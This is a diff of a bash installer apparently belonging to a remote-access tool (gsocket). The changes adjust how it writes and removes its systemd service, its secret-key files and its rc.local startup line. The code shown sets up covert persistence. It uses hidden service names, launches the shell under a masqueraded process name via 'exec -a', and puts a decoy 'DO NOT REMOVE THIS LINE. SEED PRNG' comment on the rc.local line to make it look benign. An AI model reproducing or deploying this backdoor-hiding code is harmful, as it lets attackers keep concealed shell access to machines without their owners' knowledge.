@@ -289,6 +289,8 @@ init_vars()
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
+	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
+	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 
 	DEBUGF "SRC_PKG=$SRC_PKG"
 }
@@ -320,8 +322,6 @@ init_setup()
 
 	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
 
-	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
-	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
 	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\""
 
@@ -423,9 +423,11 @@ uninstall()
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
 	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
-	uninstall_rm "${SERVICE_FILE}"
-	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
+	[[ -f "${SERVICE_FILE}" ]] && {
+		command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
+		uninstall_rm "${SERVICE_FILE}"
+	}
+	uninstall_rm "${SYSTEMD_SEC_FILE}"
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
 	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
@@ -509,6 +511,7 @@ install_system_systemd()
 	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
 	command -v systemctl >/dev/null || return
 	[[ "$(systemctl is-system-running 2>/dev/null)" = *"offline"* ]] &>/dev/null && return
+
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
@@ -538,7 +541,7 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 	chmod 600 "${SERVICE_FILE}"
 	gs_secret_write "$SYSTEMD_SEC_FILE"
 
-	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work... 
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}" "${SYSTEMD_SEC_FILE}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
 	IS_INSTALLED=1
@@ -566,6 +569,8 @@ install_to_file()
 install_system_rclocal()
 {
 	[[ ! -f "${RCLOCAL_FILE}" ]] && return
+	# Some systems have /etc/rc.local but it's not executeable...
+	[[ ! -x "${RCLOCAL_FILE}" ]] && return
 	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
